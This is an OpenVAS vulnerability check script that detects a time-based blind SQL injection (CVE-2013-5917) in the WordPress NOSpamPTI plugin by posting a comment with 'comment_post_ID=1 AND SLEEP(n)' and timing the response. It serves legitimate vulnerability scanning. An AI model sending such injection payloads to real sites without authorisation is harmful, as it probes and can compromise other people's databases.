###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_nospampti_blind_sql_inj_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# WordPress NOSpamPTI Plugin 'comment_post_ID' Parameter SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804021");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2013-5917");
  script_bugtraq_id(62580);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-09-27 18:32:16 +0530 (Fri, 27 Sep 2013)");
  script_name("WordPress NOSpamPTI Plugin 'comment_post_ID' Parameter SQL Injection Vulnerability");

  script_tag(name:"summary", value:"This host is installed with WordPress NOSpamPTI plugin and is prone to sql
injection vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check whether it is able to execute sql
command or not.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"insight", value:"Input passed via the 'comment_post_ID' parameter to wp-comments-post.php
script is not properly sanitised before being used in the code.");
  script_tag(name:"affected", value:"WordPress NOSpamPTI Plugin version 2.1 and prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or
disclosure of arbitrary data.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Sep/101");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!http_port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/wp-comments-post.php";

sleep = make_list(1 , 3);

host = http_host_name(port:http_port);

foreach i (sleep)
{
  comment = rand_str(length:8);

  postData = "author=OpenVAS&email=test%40mail.com&url=1&comment=" + comment  +
             "&submit=Post+Comment&comment_post_ID=1 AND SLEEP(" + i + ")&comment_parent=0";

  asReq = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData);

  start = unixtime();
  asRes = http_keepalive_send_recv(port:http_port, data:asReq);
  stop = unixtime();

  if(stop - start < i || stop - start > (i+5)) exit(0); # not vulnerable
  else temp += 1;
}

if (temp == 2 )
{
  security_message(port:http_port);
  exit(0);
}
